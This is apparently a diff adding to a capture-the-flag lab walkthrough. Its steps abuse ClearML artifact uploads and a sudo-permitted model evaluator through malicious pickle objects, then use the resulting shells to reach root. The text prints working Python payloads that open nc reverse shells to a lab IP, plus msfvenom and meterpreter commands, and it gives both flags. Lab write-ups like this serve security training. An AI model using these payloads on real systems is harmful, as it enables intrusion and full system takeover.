@@ -41,7 +41,87 @@ pip install clearml
 after we downloaded the tool we need to launch it:
 clearml-init
 
+to get the reverse shell we will need a script:
+
+import os
+from clearml import Task
+import base64
+import time
+
+task = Task.init(project_name='Black Swan', task_name='Generate and Upload Pickle', tags=["review"], task_type=Task.TaskTypes.data_processing)
+
+class Pickle:
+	def __reduce__(self):
+		cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.107 4242 >/tmp/f"
+		return os.system, (cmd,)
 
 
+rng_name = base64.b64encode(str(time.time()).encode()).decode()
+task.upload_artifact(name=rng_name, artifact_object=Pickle())
+task.execute_remotely(queue_name='default')
 
+it might be that some libraries is missing, downloading it via pip3 install
 
+launching the listener:
+rlwrap nc -lvnp 4242 
+
+after clearml-init we need to enter the parameters it asks for and waiting for the response of reverse shell in listener
+
+and we get the reverse shell as jippity
+
+userflag:
+cdcfe6450318e45ec96ee08591d64b1f
+
+in sudo -l we see that it can run /usr/bin/evaluated_models /models/*.pth 
+
+to use this exploit we will need another script:
+
+import torch
+import torch.nn as nn
+import os
+
+class CustomModel(nn.Module):
+    def __init__(self):
+        super(CustomModel, self).__init__()
+        self.linear = nn.Linear(10, 1)
+
+    def forward(self, x):
+        return self.linear(x)
+
+    def __reduce__(self):
+        # Custom reduce method
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.107 4246 >/tmp/f"
+        return os.system, (cmd,)
+
+# Create an instance of the model
+model = CustomModel()
+# Save the model using torch.save
+torch.save(model, 'evil.pth')
+
+i had missing torch library so i had to download it, it weights 700+ mb so it could take time
+
+after we downloaded it,running the script and get evil.pth script,encodeding it to base64:
+
+cat evil.pth | base64 -w 0
+
+before that we need to upload a msfvenom payload to get a better shell:
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f elf -o s
+
+msfconsole -x "use exploits/multi/handler; set lhost tun0; set lport 4244; set payload linux/x64/meterpreter/reverse_tcp; exploit"
+
+taking the encoded text and inserting it to /models :
+
+echo <encoded text> | base64 -d > /models/evil.pth
+
+now we need to open another listener with other port
+
+after that we run the binary:
+
+sudo /usr/bin/evaluated_models /models/evil.pth
+
+and we get the root shell
+
+rootflag:
+
+e3e171cc7c8f5e74a63b2cbf7c7fa124
